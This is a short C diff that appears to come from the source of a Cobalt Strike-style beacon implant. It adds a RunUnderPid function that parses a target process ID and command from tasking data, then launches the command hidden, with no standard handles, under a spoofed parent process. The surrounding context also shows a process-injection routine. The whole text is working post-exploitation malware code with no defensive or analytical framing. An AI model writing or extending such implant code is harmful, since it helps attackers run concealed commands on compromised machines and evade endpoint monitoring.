@@ -1300,6 +1300,31 @@ BOOL RunUnderParent(char* cmd, int cmdLength, STARTUPINFO* startupInfo, PROCESS_
 	return RunUnder(cmd, cmdLength, startupInfo, processInfo, creationFlags, ignoreToken, gParentPid);
 }
 
+void RunUnderPid(char* buffer, int length)
+{
+	STARTUPINFOA si = { sizeof(si) };
+	PROCESS_INFORMATION pi = { 0 };
+	GetStartupInfoA(&si);
+	si.wShowWindow = SW_HIDE;
+	si.hStdInput = 0;
+	si.hStdOutput = 0;
+	si.hStdError = 0;
+	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+
+#define MAX_CMD 0x2000
+	datap* locals = BeaconDataAlloc(MAX_CMD);
+	char* cmd = BeaconDataPtr(locals, MAX_CMD);
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	int pid = BeaconDataInt(&parser);
+	BeaconDataStringCopySafe(&parser, cmd, MAX_CMD);
+	RunUnder(cmd, strlen(cmd), &si, &pi, CREATE_NEW_CONSOLE, FALSE, pid);
+	BeaconCleanupProcess(&pi);
+
+	BeaconDataFree(locals);
+}
+
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
